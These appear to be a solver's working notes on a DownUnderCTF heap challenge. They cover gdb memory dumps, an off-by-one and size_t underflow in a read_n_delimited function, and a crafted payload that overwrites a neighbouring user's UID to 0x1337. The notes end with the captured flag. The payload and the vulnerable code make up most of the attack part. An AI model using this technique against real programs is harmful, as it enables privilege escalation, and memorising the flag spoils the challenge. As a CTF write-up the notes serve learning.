heap exploit?

or nah because there's only malloc and usage, no free

- integer type confusion/underflow not possible because size_t is used in most things
- overflow unsure, read_n_delimited looks pretty tight to me 
	- altho maybe there's always the one byte off
- cascading login; when a user is found, all other user UIDs are leaked
- username clash is possible

can input nullbytes into login?

after the first add user:

```
(gdb) x/32x (char*)users
0x5555555592a0:	0x00001338	0x41414141	0x41414141	0x42424242
0x5555555592b0:	0x42424242	0x43434343	0x00434343	0x00000000
0x5555555592c0:	0x00000000	0x00000000	0x00000000	0x00000000
0x5555555592d0:	0x00000000	0x00000000	0x00000000	0x00000000
0x5555555592e0:	0x00000000	0x00000000	0x00000000	0x00000000
0x5555555592f0:	0x00000000	0x00000000	0x00000000	0x00000000
0x555555559300:	0x00000000	0x00000000	0x00000000	0x00000000
```

where username length input was 24, user AAAAAAAABBBBBBBBCCCCCCC (len 23)

```
Breakpoint 1, 0x00005555555553e8 in add_user ()
(gdb) c
Continuing.
malloc(): corrupted top size
```

so it broke malloc...?

i guess i do have one byte to work with

```
0x5555555592a0:	0x00001338	0x41414141	0x41414141	0x42424242
0x5555555592b0:	0x42424242	0x43434343	0x00000021	0x00000000

0x5555555592c0:	0x00001339	0x42424242	0x42424242	0x42424242
0x5555555592d0:	0x42424242	0x42424242	0x00000021	0x00000000
										^ 21 is the malloc header

0x5555555592e0:	0x0000133a	0x41414141	0x41414141	0x42424242
0x5555555592f0:	0x42424242	0x43434343	0x00434343	0x00000000

0x555555559300:	0x00000000	0x00000000	0x00000000	0x00000000
0x555555559310:	0x00000000	0x00000000	0x00000000	0x00000000

```

normal circumstance:

```
0x5555555592a0:	0x00001338	0x41414141	0x41414141	0x42424242
0x5555555592b0:	0x42424242	0x43434343	0x00000021	0x00000000
0x5555555592c0:	0x00001339	0x61616161	0x00000000	0x00000000
0x5555555592d0:	0x00000000	0x00000000	0x00004321	0x00000000
										^ top chunk
```

trying to overwrite the previous chunk size by using ' ' (0x20)

so username is "AAAAAAAABBBBBBBBCCCC   " (A x 8 + B x 8 + C x 4 + " " x 3)

still overwrote too much:

```
(gdb) x/32x (char*)users
0x5555555592a0:	0x00001338	0x66647361	0x00000000	0x00000000
0x5555555592b0:	0x00000000	0x00000000	0x00000021	0x00000000
0x5555555592c0:	0x00001339	0x41414141	0x41414141	0x42424242
0x5555555592d0:	0x42424242	0x43434343	0x00202020	0x00000000
```

so i guess we need null bytes for a more controlled write

looks like i can make the prev_size bigger but not smaller

try 40/41? so we skip over one and can write directly to something

## vuln in read_n_delimited

```c

void read_n_delimited(char* buf, size_t n, char delimiter) {
    char c;
    size_t i = 0;
    while(i <= n - 1) { // BUG if n = 0, i <= -1 because size_t n is going to underflow into 2^32-1 / infinity
        if(read(0, &c, 1) != 1) {
            break;
        }

        if(c == delimiter) {
            break;
        }

        buf[i++] = c;
    }
    buf[i] = '\0';
}
```

crafting the exploit:

```
0x560989d3b2a0:	0x00001338	0x00000030	0x00000000	0x00000000
0x560989d3b2b0:	0x00000000	0x00000000	0x00000021	0x00000000 -> 7x8=56 til the next chunk, then 37130000, then 31000000
0x560989d3b2c0:	0x00001339	0x00000031	0x00000000	0x00000000
0x560989d3b2d0:	0x00000000	0x00000000	0x00000021	0x00000000
```

b"A" * 56 + b"\x37\x13\x00\x00" + b"\x31\x00\x00\x00"

didn't work; i need the heap to look like when ive just added one user

```
0x5636b65ab2a0:	0x00001338	0x42424242	0x42424242	0x42424242
0x5636b65ab2b0:	0x42424242	0x42424242	0x00020d51	0x00000000
```

now we craft that same thing, with the top_size metadata intact and then overflow 1337 into the next uid:

```py
payload = b"B" * 20 +  top_size   +   b"\x00" * 4 + b"\x37\x13\x00\x00"
```


```
$ ls chal
flag.txt
pwn
$ cat chal/flag.txt
DUCTF{th3_4uth_1s_s0_bad_1t_d0esnt_ev3n_us3_p4ssw0rds}

```





